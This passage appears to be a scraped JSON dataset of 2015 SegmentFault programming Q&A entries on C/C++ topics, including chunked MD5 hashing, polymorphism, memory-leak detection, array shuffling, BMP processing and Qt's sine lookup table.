tmp1-&gt;rchild-&gt;rchild;\n            tmp2-&gt;rchild-&gt;lchild = tmp2;\n            tmp2-&gt;rchild = NULL;\n            tmp2 = tmp1-&gt;rchild-&gt;rchild;\n        }\n        else\n            break;\n    }\n};</code></pre>\n</div>",
      "favourite": "0",
      "glance": "456",
      "tags": [
        "c++",
        "dsw算法",
        "二叉树",
        "数据结构"
      ],
      "time": "2015-10-23",
      "title": "平衡二叉树DSW算法的实现？",
      "url": "https://segmentfault.com/q/1010000003899281"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003904111\">\n<p>多次使用update接口</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003923509\">\n<p>谁说Java MD5一个文件流要把文件都加载到内存中的啊？用一个buffer，大概8KB就可以，一边读，一遍update就可以了，内存消耗是O(1)的。</p>\n<p>另外，这不是加密。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003903993\">\n<p>md5函数都支持分段计算，只要你分割的文件不添加额外的文件内容，计算出来的就和未分割之前的是一致的。</p>\n<pre><code>#include&lt;stdio.h&gt;\n#include&lt;openssl/md5.h&gt;\n#include&lt;string.h&gt;\n\nint main( int argc, char **argv )\n{\nMD5_CTX ctx;\nunsigned char *data=\"123\";\nunsigned char md[16];\nchar buf[33]={'\\0'};\nchar tmp[3]={'\\0'};\nint i;\n\nMD5_Init(&amp;ctx);\nMD5_Update(&amp;ctx,data,strlen(data));//多次调用这个函数就可以了，你可以每次update 1kB的数据\nMD5_Final(md,&amp;ctx);//所有的文件都处理完了，调用这个函数就行了\n\nfor( i=0; i&lt;16; i++ ){\nsprintf(tmp,\"%02X\",md[i]);\nstrcat(buf,tmp);\n}\nprintf(\"%s\\n\",buf);\nreturn 0;\n}</code></pre>\n</div>",
      "attention": "6",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003903942\">\n<p>由于内存有限，嵌入式环境下要计算一个50mb文件的md5码，需要分成10mb的小段，如何计算使得分割的文件最后计算的md5码和通过整个文件计算的md5码相同</p>\n</div>",
      "favourite": "2",
      "glance": "1.1k",
      "tags": [
        "c",
        "c++",
        "php",
        "c#",
        "java"
      ],
      "time": "2015-10-25",
      "title": "md5加密问题",
      "url": "https://segmentfault.com/q/1010000003903942"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003933303\">\n<p>面向对象三个基本特征：封装，继承，多态。<br>多态性相对于前二者而言是最灵活的，也是面向对象比较核心的部分。<br>但针对面试官的问题：没有多态就不能实现某种功能的情况，答案是否定的。<br>很多重要的系统及应用，考虑到性能及开发流程，使用机构化语言（C）的更多。<br>只能说，使用了多态，能让某些功能的实现看起来更“优雅”。<br>当年C++的作者劝说UNIX的作者用C++编写系统时，后者只是微笑沉默拒绝。这其中有自己的哲学。</br></br></br></br></br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003935533\">\n<p>最后一个问题，估计是想让你用c来模拟多态，大体的思路是，使用结构体+函数指针来模拟类，使用工厂函数来给函数指针赋值，最后通过使用结构体.成员函数的来触发调用，完成多态的实现方式。</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003934930\">\n<p>google搜下便有答案: <a href=\"https://www.quora.com/Whats-the-difference-between-C-and-C++\">https://www.quora.com/Whats-the-difference-between-C-and-C++</a></p>\n<hr>\n<p>对于第二个问题: 如果多态指的是技术，答案是没有，因为从技术上看，面向对象只是面向过程的语法糖;如果指思想，答案是有，没有多态的思想，许多接口设计会寸步难行。</p>\n</hr></div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003932623\">\n<p><strong>今天面试同样被问到的一个问题，C与C++的区别.</strong><br>我的回答如下：<br>C是面向过程，C++是面向对象。<br>C++里有函数重载，C中没有函数重载。<br>C++是面向对象的，有重载 继承 多态三种特性</br></br></br></br></p>\n<p>然后面试官问我多态的用处，坦率的讲我所理解的多态如下:</p>\n<pre><code>class animal\n{\n    virtual void speak();\n    \n}\nclass dog:public animal\n{\n    void speak()\n    {\n        cout&lt;&lt;\"旺旺\"&lt;&lt;endl;\n    }\n}\n我所理解的多态就是\ndog d;\nanimal *ptr=&amp;d;\nptr-&gt;speak()//这个时候输出旺旺\n</code></pre>\n<p>面试时我说多态是比如基类指针指向子类对象，调用基类virtual函数时实际调用子类覆盖的虚函数。<br><strong>然后面试官问，有没有一种情况下，没有多态的话你就实现不了某种功能的情况呢？</strong><br>坦率的讲，对于多态我真的只有上面的一点肤浅的理解，我先搜搜相关内容，欢迎各位在此讨论，问题已加粗。</br></br></p>\n</div>",
      "favourite": "0",
      "glance": "754",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-10-30",
      "title": "C与C++的区别",
      "url": "https://segmentfault.com/q/1010000003932623"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "5",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003942899\">\n<p>用友今天的笔试题，设计类<br>根据下面的描述画出实现该功能的类图<br>目前海关针对书籍  食品 药品的税收如下：<br>基本销售税率为10%，除食品外都要征收<br>进口附加税5%，所有进口商品都要征收没有例外。</br></br></br></br></p>\n<p>提示：要考虑征收的税种会增加，税率会变化以及征收商品种类的变化。</p>\n<p>我对设计模式之类的一无所知，不知道这个题会不会用到设计模式的知识，我再考场上完全不知道如何作答。</p>\n</div>",
      "favourite": "0",
      "glance": "385",
      "tags": [
        "c++"
      ],
      "time": "2015-11-02",
      "title": "用友笔试题类设计",
      "url": "https://segmentfault.com/q/1010000003942899"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003963945\">\n<p>我们用Valgrind.<br>另外，就回答这个面试题而言，我觉得可以这么答：调用brk(0)返回堆顶地址..</br></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003962735\">\n<p>Purify或者strike</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003976962\">\n<p>内存越来越大不一定是内存泄露，也有可能是自己做的cache<br>我觉得这个问题比较优雅的答案是：<br>1) 先确定是否为内存泄露，内存长期占用不释放（有的程序自己做了memory pool，是会自己触发释放的）为泄露，否则可能是程序内部有cache，也可能是程序自己对内存管理有池化<br>2）先用静态分析工具查看下可能的内存泄露<br>3）运行时的内存泄露不是工具能查出来的,需要自己分析，C++比较BT的一点是内存泄露是隐性的，而非显性的，如果整个程序全是静态库的，可以针对接口进行测试，确认大概是哪个模块造成了泄露，如果是有动态库包含在其中的，也建议先对接口进行测试，确认哪些模块会造成内存泄露，然后确认接口间的调用是否正常，看是否有隐形的泄露，也有些工具如purify可以打印些堆栈信息，不过针对特别复杂的环境，这个帮助还是有限。 而且windows和linux对于C++的某些features的实现也不尽相同，也有可能造成泄露，曾经见过一个库非常稳定的运行在Linux下，在windows下就会造成莫名其妙的泄露（一样的源码，支持跨平台）</br></br></br></br></p>\n</div>",
      "attention": "11",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003961918\">\n<p>今天面试时面试官问了一道很有意思的题。<br>在某个程序运行期间，系统检测到其使用的内存越来越大，如何检测内存泄露的具体位置。</br></p>\n<p>我当时就不会了。</p>\n</div>",
      "favourite": "5",
      "glance": "1.1k",
      "tags": [
        "c++"
      ],
      "time": "2015-11-06",
      "title": "C++内存泄露检测",
      "url": "https://segmentfault.com/q/1010000003961918"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000003963975\">\n<ol>\n<li><p>初始化一个从1~100的数组</p></li>\n<li><p>从0~99循环，每次生成一个0~99的随机数n，将当前数组元素与第n个元素交换<br>结果就是需要的随机数组</br></p></li>\n</ol>\n<h3>谁踩的，来来来，敢不敢来咱们探讨一下人生！<a href=\"http://codepad.org/TPoDUiQV\">http://codepad.org/TPoDUiQV</a>\n</h3>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000003969341\">\n<p>对m-n随机排序可以用random_shuffle</p>\n<pre><code>  using namespace std;\n\n  vector&lt;int&gt; vec;\n  generate_n(back_inserter(vec), 100, [i = 0]() mutable {\n    return i++;\n  });\n  random_shuffle(begin(vec), end(vec));\n  copy(begin(vec), end(vec), ostream_iterator&lt;int&gt;(cout, \" \"));</code></pre>\n<p>set容器是有序容器，遍历的时候是已经排序了的，所以用set是不行的，除非使用自定义比较，在自定义比较中实现随机排序</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000003973563\">\n<p>有个问题叫做“完美洗牌”，意思是说，一副牌去掉大小王还剩52张，现在要洗这52张牌。显然，洗牌共有52!种结果。完美洗牌要求52!种洗牌结果出现的概率相同。</p>\n<p>有没有感觉很像？这道面试题要求数字分布“无规律”，也就是要求每种结果出现的概率满足随机均匀分布。所以这道题目相当于完美洗牌，只不过要洗100张牌。</p>\n<p>简单起见，以5张牌为例：A, B, C, D, E，问题是，能否在完美洗前4张牌的基础上，把战果扩大为完美洗5张牌呢？如果可以，那么我们就可以用迭代或者递归解决完美洗牌问题。幸好，答案真的是“可以”。</p>\n<p>假设A, B, C, D已经实现了完美洗牌，现在来了第5张牌E，可以在A, B, C, D中随机挑选一张牌，即rand(0, 3)，然后将这张牌和E交换，于是这5张牌就实现了完美洗牌。</p>\n<p>用C++解决这道题目：</p>\n<pre><code>#include &lt;cstdlib&gt;\n#include &lt;ctime&gt;\n#include &lt;cassert&gt;\n#include &lt;iostream&gt;\n\nvoid shuffle(int *arr, int n) {\n  assert(arr &amp;&amp; n &gt; 0);\n  for (int i = 0; i &lt; n; ++i) {\n    int r = rand() % (i + 1);\n    int temp = arr[r];\n    arr[r] = arr[i];\n    arr[i] = temp;\n  }\n}\n\nint main() {\n  int arr[100];\n  for (int i = 0; i &lt; 100; ++i) {\n    arr[i] = i + 1;\n  }\n  srand(time(NULL));\n  shuffle(arr, 100);\n  for (int i = 0; i &lt; 100; ++i) {\n    std::cout &lt;&lt; arr[i] &lt;&lt; ' ';\n    if ((i + 1) % 10 == 0) {\n      std::cout &lt;&lt; std::endl;\n    }\n  }\n  return 0;\n}\n</code></pre>\n<p>结果如下所示：</p>\n<pre><code>4 51 11 58 14 81 67 25 61 57 \n76 22 34 12 98 16 45 55 100 89 \n37 88 15 75 99 73 96 66 63 54 \n8 83 1 93 42 48 86 85 9 71 \n6 59 40 46 31 19 17 53 7 29 \n13 2 32 56 74 52 60 30 26 77 \n38 64 33 3 50 78 43 21 47 97 \n62 69 72 92 10 27 24 28 79 87 \n5 36 65 90 91 35 20 80 70 23 \n39 41 84 82 94 49 95 68 44 18 </code></pre>\n</div>",
      "attention": "17",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000003963742\">\n<p>今天面试遇到的题，题目要求，往a[100]中插入1-100的数字，要求每个数字都不同且无规律。</p>\n<p>我说了两种思路，然后第一种方法，初始化a[100]={0},然后每生成一个随机数与之前插入的数字比较，如果相同则重新生成，时间复杂度为n*n,然后面试官这个不够高效，他说插入最后一个元素时你可能要随机生成多次。</p>\n<p>然后我昨天看了下stl里的东西，set里布允许有重复元素，所以我想到了思路二，可以生成随机数往set里插入，当set的size()到100时停止，然后我刚写得代码如下，结果却不是我想要的结果。</p>\n<pre><code>int main()\n{\n    set&lt;int&gt; nums;\n    srand((unsigned int)time(nullptr));\n    while(nums.size()&lt;100)\n    {\n       \n        nums.insert(random()%100+1);\n    }\n    \n    \n    for(auto &amp;i:nums)\n        cout&lt;&lt;i&lt;&lt;\" \";\n    return 0;\n}\n</code></pre>\n<p>输出结果为：<br>1 2 3 4 5 6 7 8 9 10 11 12 13 14 15 16 17 18 19 20 21 22 23 24 25 26 27 28 29 30 31 32 33 34 35 36 37 38 39 40 41 42 43 44 45 46 47 48 49 50 51 52 53 54 55 56 57 58 59 60 61 62 63 64 65 66 67 68 69 70 71 72 73 74 75 76 77 78 79 80 81 82 83 84 85 86 87 88 89 90 91 92 93 94 95 96 97 98 99 100 </br></p>\n<p>生成种子放在while内和while外都是一个结果，跪求分析程序的问题所在.</p>\n</div>",
      "favourite": "4",
      "glance": "1.1k",
      "tags": [
        "c",
        "c++"
      ],
      "time": "2015-11-07",
      "title": "随机往数组中插入1-100的数字",
      "url": "https://segmentfault.com/q/1010000003963742"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004043346\">\n<p>应该是在程序设计时就有漏洞，从而在运行上反映了代码设计的漏洞。<br>C语言需要全面掌握编译器特性以及相关计算机底层知识</br></p>\n<p>另外一方面就是多看看大牛们的代码，多调试。多多熟悉编译器，多使用成熟的监测工具</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004056290\">\n<p>纠正个拼写错误core dump</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004043299\">\n<p>两方面吧，从语言看，C语言不自带内存管理机制，而Java、C#、js等语言自带了内存管理机制。内存管理就是容比较易出问题的一个地方，对程序员要求很高。<br>从运行时看，大部分C语言编译之后直接跑在硬件，语任何错误都直接反应到硬件上；而与之相对的解释型语言或者编译后跑在虚拟机上的语言，解释器或虚拟机本身在执行过程中会做很多检查，尽可能的避免奔溃。</br></p>\n</div>",
      "attention": "10",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004039201\">\n<p>为什么写c语言很容易core down?</p>\n</div>",
      "favourite": "1",
      "glance": "1.1k",
      "tags": [
        "c++",
        "c"
      ],
      "time": "2015-11-24",
      "title": "为什么写c语言很容易core down?",
      "url": "https://segmentfault.com/q/1010000004039201"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004056713\">\n<p><a href=\"http://www.zhihu.com/question/19853176\">http://www.zhihu.com/question/19853176</a></p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004056717\">\n<p>猜测是everything做的索引更利于搜索吧，等高人来指点</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004057891\">\n<p><a href=\"http://everythingsz.codeplex.com/\">http://everythingsz.codeplex.com/</a></p>\n<p>我的朋友曾经用C#重新实现了一次everything，，题主可以参考一下。看C#代码有一个好处，你一旦发现一个函数是从dll导入的，而不是.net提供的，那你就去MSDN找这个API的说明，很容易就弄明白了。</p>\n<p>原理跟原版的everything是完全相同的，都是去读NTFS的磁盘记录，从而绕过所有多余的文件系统的代码。</p>\n</div>",
      "attention": "8",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004056655\">\n<p>Windows下的文件搜索工具Everything，为什么速度那么快，而Windows自己的却没有那么快，Everything是如何实现的，如果自己实现一个，要从哪里入手？</p>\n</div>",
      "favourite": "2",
      "glance": "584",
      "tags": [
        "c++",
        "c",
        "windows"
      ],
      "time": "2015-11-27",
      "title": "Windows下的文件搜索工具Everything，为什么速度那么快，如果自己实现一个，要从哪里入手？",
      "url": "https://segmentfault.com/q/1010000004056655"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004056853\">\n<p>对一个类进行测试，想对其中的私有成员变量进行检查，请问可以和单元测试类设置友元类么？</p>\n</div>",
      "favourite": "0",
      "glance": "462",
      "tags": [
        "c++"
      ],
      "time": "2015-11-27",
      "title": "如何在Visual studio 15中自带的单元测试框架中使用友元类？",
      "url": "https://segmentfault.com/q/1010000004056853"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "4",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004073432\">\n<p>如下所示，这本书前面告诉我尽量用make_shared初始化shared_ptr，这章中为何都是用new来初始化呢？难道是因为忘记更新第5版这章中的c++11的改动了吗？</p>\n<pre><code>class Query\n{\n    friend Query operator~(const Query&amp;);\n    friend Query operator|(const Query&amp;, const Query&amp;);\n    friend Query operator&amp;(const Query&amp;, const Query&amp;);\npublic:\n    //! build a new WordQuery\n    Query(const std::string&amp; s) : q(new WordQuery(s))  //就是这里\n    {\n        std::cout &lt;&lt; \"Query::Query(const std::string&amp; s) where s=\" + s + \"\\n\";\n    }\n\n    //! interface functions: call the corresponding Query_base operatopns\n    QueryResult eval(const TextQuery&amp; t) const\n    {\n        return q-&gt;eval(t);\n    }\n    std::string rep() const\n    {\n        std::cout &lt;&lt; \"Query::rep() \\n\";\n        return q-&gt;rep();\n    }\n\nprivate:\n    //! constructor only for friends\n    Query(std::shared_ptr&lt;Query_base&gt; query) :\n        q(query)\n    {\n        std::cout &lt;&lt; \"Query::Query(std::shared_ptr&lt;Query_base&gt; query)\\n\";\n    }\n    std::shared_ptr&lt;Query_base&gt; q;\n};</code></pre>\n</div>",
      "favourite": "0",
      "glance": "523",
      "tags": [
        "c++"
      ],
      "time": "2015-11-30",
      "title": "c++primer第15章最后部分的类为什么不用make_shared而是用new初始化shared_ptr?",
      "url": "https://segmentfault.com/q/1010000004073432"
    },
    {
      "answer1": "<div class=\"answer fmt\" data-id=\"1020000004077035\">\n<h2>使用Windows Imaging Component读取图片（兼容bmp、jpg、png等常见格式）</h2>\n<p>1、使用CoCreateInstance创建<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ee690281(v=vs.85).aspx\">IWICImagingFactory</a><br>2、使用IWICImagingFactory::CreateDecoderFromFilename创建一个<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ee690086(v=vs.85).aspx\">IWICBitmapDecoder</a><br>3、使用IWICBitmapDecoder::GetFrame获得一个<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ee690134(v=vs.85).aspx\">IWICBitmapFrameDecoder</a><br>4、使用IWICImagingFactory::CreateFormatConverter创建一个<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ee690274(v=vs.85).aspx\">IWICFormatConverter</a>，并使用你喜爱的格式初始化他，使用第三步创建好的对象调用IWICFormatConverter::Initialize函数<br>5、如果第四步成功了，那么就把IWICFormatConverter转成IWICBitmapSource，否则就把IWICBitmapFrameDecoder转成IWICBitmapSource<br>6、使用IWICImagingFactory::CreateBitmapFromSource从IWICBitmapSource获取<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/ee719675(v=vs.85).aspx\">IWICBitmap</a></br></br></br></br></br></p>\n<h2>使用Direct2D获取图形</h2>\n<p>鉴于d2d资料较多，请自行查找。首先就是创建一个空的位图，然后使用这个位图创建<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd371766(v=vs.85).aspx\">ID2D1RenderTarget</a>，然后使用ID2D1RenderTarget::CreateBitmapFromWicBitmap，从刚才获取的IWICBitmap创建出一个<a href=\"https://msdn.microsoft.com/en-us/library/windows/desktop/dd371109(v=vs.85).aspx\">ID2D1Bitmap</a>。这样你就拥有了两个bitmap，第一个是从文件里面读进来的，第二个是你创建的一个空白bitmap。<strong>最后使用render target的各种effect、shader和函数，就使用你喜欢的任何效果，譬如旋转、灰度、二值等，把读进来的bitmap画到空白的bitmap上去。最后把bitmap一保存，就搞定了。</strong></p>\n<h2>总结</h2>\n<p>最困难的部分就是读写文件，效果什么的都是现成的。Direct2D比GDI+还要好用，性能还高，而且绝不兼容Windows XP。</p>\n</div>",
      "answer2": "<div class=\"answer fmt\" data-id=\"1020000004076968\">\n<p>OpenCV吧</p>\n</div>",
      "answer_accepted": "<div class=\"answer fmt\" data-id=\"1020000004078976\">\n<p>这么巧？<br>发现各种找到的库都非常巨大，抽象层次也很高，不能满足需求<br>自己刚写了一个C++读写bmp的类，支持8位灰度图，24位RGB图。</br></br></p>\n<p><a href=\"https://github.com/edimetia3d/simpleBMP\">https://github.com/edimetia3d/simpleBMP</a></p>\n<p>代码很短，其实看源码10分钟就了解干了些什么。</p>\n<p>简要说明一下：<br>没有任何抽象，读取就是把bmp里的所有数据(是的，每个字节都用上了)都映射到某个定义过的变量。<br>保存就是把这些变量再写回磁盘。</br></br></p>\n<p>其实最初是打算完全按照C来写的，对动态内存不太感冒，所以用了vector<br>读写部分用的还是fread fwrite，把vector的部分换成动态内存就完全可以在C下运行了。<br>每个变量的意思见<br><a href=\"http://www.cnblogs.com/xiekeli/archive/2012/05/09/2491191.html\">http://www.cnblogs.com/xiekeli/archive/2012/05/09/2491191.html</a><br>具体映射关系如下。</br></br></br></br></p>\n<pre><code>typedef struct {\n    unsigned short bfType;\n    unsigned long bfSize;\n    unsigned short bfReserved1;\n    unsigned short bfReserved2;\n    unsigned long bfOffBits;\n} ClBitMapFileHeader;\n\ntypedef struct {\n    unsigned long biSize;\n    long biWidth;\n    long biHeight;\n    unsigned short biPlanes;\n    unsigned short biBitCount;\n    unsigned long biCompression;\n    unsigned long biSizeImage;\n    long biXPelsPerMeter;\n    long biYPelsPerMeter;\n    unsigned long biClrUsed;\n    unsigned long biClrImportant;\n} ClBitMapInfoHeader;\n\ntypedef struct {\n    unsigned char rgbBlue;\n    unsigned char rgbGreen;\n    unsigned char rgbRed;\n    unsigned char rgbReserved;\n} ClrgbMap;\n\nclass ClImgBMP {\npublic:\n    ClBitMapFileHeader bmpFileHeaderData;\n    ClBitMapInfoHeader bmpInfoHeaderData;\n    ClrgbMap colorMap[256];\n    vector&lt;unsigned char&gt; imgData;\n\n    bool LoadImage(const char* path);\n    bool SaveImage(const char* path);\n};</code></pre>\n</div>",
      "attention": "14",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004075952\">\n<p>求代码，用c/c++进行bmp图像的处理，处理内容包括旋转，灰度图，二值图等等。</p>\n</div>",
      "favourite": "4",
      "glance": "1.2k",
      "tags": [
        "c语言",
        "c++",
        "图像处理"
      ],
      "time": "2015-12-01",
      "title": "bmp图像如何用c/c++处理?",
      "url": "https://segmentfault.com/q/1010000004075952"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "2",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004101589\">\n<p>如题。定义一个内置类型比如int型的智能指针可以    shared_ptr&lt;int&gt;这样定义，但不知道如何定义一个指向函数的智能指针。</p>\n</div>",
      "favourite": "0",
      "glance": "517",
      "tags": [
        "c++",
        "c++11"
      ],
      "time": "2015-12-05",
      "title": "C++中如何定义一个指向函数的智能指针？",
      "url": "https://segmentfault.com/q/1010000004101589"
    },
    {
      "answer1": "",
      "answer2": "",
      "answer_accepted": "",
      "attention": "3",
      "dsc": "<div class=\"question fmt\" data-id=\"1010000004115761\">\n<pre><code>inline qreal qFastSin(qreal x)\n{\n    int si = int(x * (0.5 * QT_SINE_TABLE_SIZE / M_PI)); // Would be more accurate with qRound, but slower.\n    qreal d = x - si * (2.0 * M_PI / QT_SINE_TABLE_SIZE);\n    int ci = si + QT_SINE_TABLE_SIZE / 4;\n    si &amp;= QT_SINE_TABLE_SIZE - 1;\n    ci &amp;= QT_SINE_TABLE_SIZE - 1;\n    return qt_sine_table[si] + (qt_sine_table[ci] - 0.5 * qt_sine_table[si] * d) * d;\n}\n</code></pre>\n<p>这个<em>qt_sine_table</em>是一张长度为QT_SINE_TABLE_SIZE(256)的实数表。</p>\n<pre><code>const qreal qt_sine_table[QT_SINE_TABLE_SIZE] = {\n    qreal(0.0),\n    qreal(0.024541228522912288),\n    qreal(0.049067674327418015),\n    qreal(0.073564563599667426),\n    qreal(0.098017140329560604),\n    qreal(0.1224106751992162),\n    qreal(0.14673047445536175),\n    qreal(0.17096188876030122),\n    qreal(0.19509032201612825),\n    qreal(0.2191012401568698),\n    qreal(0.24298017990326387),\n    qreal(0.26671275747489837),\n    qreal(0.29028467725446233),\n    qreal(0.31368174039889152),\n    qreal(0.33688985339222005),\n    qreal(0.35989503653498811),\n    qreal(0.38268343236508978),\n    qreal(0.40524131400498986),\n    qreal(0.42755509343028208),\n    qreal(0.44961132965460654),\n    qreal(0.47139673682599764),\n    qreal(0.49289819222978404),\n    qreal(0.51410274419322166),\n    qreal(0.53499761988709715),\n    qreal(0.55557023301960218),\n    qreal(0.57580819141784534),\n    qreal(0.59569930449243336),\n    qreal(0.61523159058062682),\n    qreal(0.63439328416364549),\n    qreal(0.65317284295377676),\n    qreal(0.67155895484701833),\n    qreal(0.68954054473706683),\n    qreal(0.70710678118654746),\n    qreal(0.72424708295146689),\n    qreal(0.74095112535495911),\n    qreal(0.75720884650648446),\n    qreal(0.77301045336273699),\n    qreal(0.78834642762660623),\n    qreal(0.80320753148064483),\n    qreal(0.81758481315158371),\n    qreal(0.83146961230254524),\n    qreal(0.84485356524970701),\n    qreal(0.85772861000027212),\n    qreal(0.87008699110871135),\n    qreal(0.88192126434835494),\n    qreal(0.89322430119551532),\n    qreal(0.90398929312344334),\n    qreal(0.91420975570353069),\n    qreal(0.92387953251128674),\n    qreal(0.93299279883473885),\n    qreal(0.94154406518302081),\n    qreal(0.94952818059303667),\n    qreal(0.95694033573220894),\n    qreal(0.96377606579543984),\n    qreal(0.97003125319454397),\n    qreal(0.97570213003852857),\n    qreal(0.98078528040323043),\n    qreal(0.98527764238894122),\n    qreal(0.98917650996478101),\n    qreal(0.99247953459870997),\n    qreal(0.99518472667219682),\n    qreal(0.99729045667869021),\n    qreal(0.99879545620517241),\n    qreal(0.99969881869620425),\n    qreal(1.0),\n    qreal(0.99969881869620425),\n    qreal(0.99879545620517241),\n    qreal(0.99729045667869021),\n    qreal(0.99518472667219693),\n    qreal(0.99247953459870997),\n    qreal(0.98917650996478101),\n    qreal(0.98527764238894122),\n    qreal(0.98078528040323043),\n    qreal(0.97570213003852857),\n    qreal(0.97003125319454397),\n    qreal(0.96377606579543984),\n    qreal(0.95694033573220894),\n    qreal(0.94952818059303667),\n    qreal(0.94154406518302081),\n    qreal(0.93299279883473885),\n    qreal(0.92387953251128674),\n    qreal(0.91420975570353069),\n    qreal(0.90398929312344345),\n    qreal(0.89322430119551521),\n    qreal(0.88192126434835505),\n    qreal(0.87008699110871146),\n    qreal(0.85772861000027212),\n    qreal(0.84485356524970723),\n    qreal(0.83146961230254546),\n    qreal(0.81758481315158371),\n    qreal(0.80320753148064494),\n    qreal(0.78834642762660634),\n    qreal(0.7730104533627371),\n    qreal(0.75720884650648468),\n    qreal(0.74095112535495899),\n    qreal(0.72424708295146689),\n    qreal(0.70710678118654757),\n    qreal(0.68954054473706705),\n    qreal(0.67155895484701855),\n    qreal(0.65317284295377664),\n    qreal(0.63439328416364549),\n    qreal(0.61523159058062693),\n    qreal(0.59569930449243347),\n    qreal(0.57580819141784545),\n    qreal(0.55557023301960218),\n    qreal(0.53499761988709715),\n    qreal(0.51410274419322177),\n    qreal(0.49289819222978415),\n    qreal(0.47139673682599786),\n    qreal(0.44961132965460687),\n    qreal(0.42755509343028203),\n    qreal(0.40524131400498992),\n    qreal(0.38268343236508989),\n    qreal(0.35989503653498833),\n    qreal(0.33688985339222033),\n    qreal(0.31368174039889141),\n    qreal(0.29028467725446239),\n    qreal(0.26671275747489848),\n    qreal(0.24298017990326407),\n    qreal(0.21910124015687005),\n    qreal(0.19509032201612861),\n    qreal(0.17096188876030122),\n    qreal(0.1467304744553618),\n    qreal(0.12241067519921635),\n    qreal(0.098017140329560826),\n    qreal(0.073564563599667732),\n    qreal(0.049067674327417966),\n    qreal(0.024541228522912326),\n    qreal(0.0),\n    qreal(-0.02454122852291208),\n    qreal(-0.049067674327417724),\n    qreal(-0.073564563599667496),\n    qreal(-0.09801714032956059),\n    qreal(-0.1224106751992161),\n    qreal(-0.14673047445536158),\n    qreal(-0.17096188876030097),\n    qreal(-0.19509032201612836),\n    qreal(-0.2191012401568698),\n    qreal(-0.24298017990326382),\n    qreal(-0.26671275747489825),\n    qreal(-0.29028467725446211),\n    qreal(-0.31368174039889118),\n    qreal(-0.33688985339222011),\n    qreal(-0.35989503653498811),\n    qreal(-0.38268343236508967),\n    qreal(-0.40524131400498969),\n    qreal(-0.42755509343028181),\n    qreal(-0.44961132965460665),\n    qreal(-0.47139673682599764),\n    qreal(-0.49289819222978393),\n    qreal(-0.51410274419322155),\n    qreal(-0.53499761988709693),\n    qreal(-0.55557023301960196),\n    qreal(-0.57580819141784534),\n    qreal(-0.59569930449243325),\n    qreal(-0.61523159058062671),\n    qreal(-0.63439328416364527),\n    qreal(-0.65317284295377653),\n    qreal(-0.67155895484701844),\n    qreal(-0.68954054473706683),\n    qreal(-0.70710678118654746),\n    qreal(-0.72424708295146678),\n    qreal(-0.74095112535495888),\n    qreal(-0.75720884650648423),\n    qreal(-0.77301045336273666),\n    qreal(-0.78834642762660589),\n    qreal(-0.80320753148064505),\n    qreal(-0.81758481315158382),\n    qreal(-0.83146961230254524),\n    qreal(-0.84485356524970701),\n    qreal(-0.85772861000027201),\n    qreal(-0.87008699110871135),\n    qreal(-0.88192126434835494),\n    qreal(-0.89322430119551521),\n    qreal(-0.90398929312344312),\n    qreal(-0.91420975570353047),\n    qreal(-0.92387953251128652),\n    qreal(-0.93299279883473896),\n    qreal(-0.94154406518302081),\n    qreal(-0.94952818059303667),\n    qreal(-0.95694033573220882),\n    qreal(-0.96377606579543984),\n    qreal(-0.97003125319454397),\n    qreal(-0.97570213003852846),\n    qreal(-0.98078528040323032),\n    qreal(-0.98527764238894111),\n    qreal(-0.9891765099647809),\n    qreal(-0.99247953459871008),\n    qreal(-0.99518472667219693),\n    qreal(-0.99729045667869021),\n    qreal(-0.99879545620517241),\n    qreal(-0.99969881869620425),\n    qreal(-1.0),\n    qreal(-0.99969881869620425),\n    qreal(-0.99879545620517241),\n    qreal(-0.99729045667869021),\n    qreal(-0.99518472667219693),\n    qreal(-0.99247953459871008),\n    qreal(-0.9891765099647809),\n    qreal(-0.98527764238894122),\n    qreal(-0.98078528040323043),\n    qreal(-0.97570213003852857),\n    qreal(-0.97003125319454397),\n    qreal(-0.96377606579543995),\n    qreal(-0.95694033573220894),\n    qreal(-0.94952818059303679),\n    qreal(-0.94154406518302092),\n    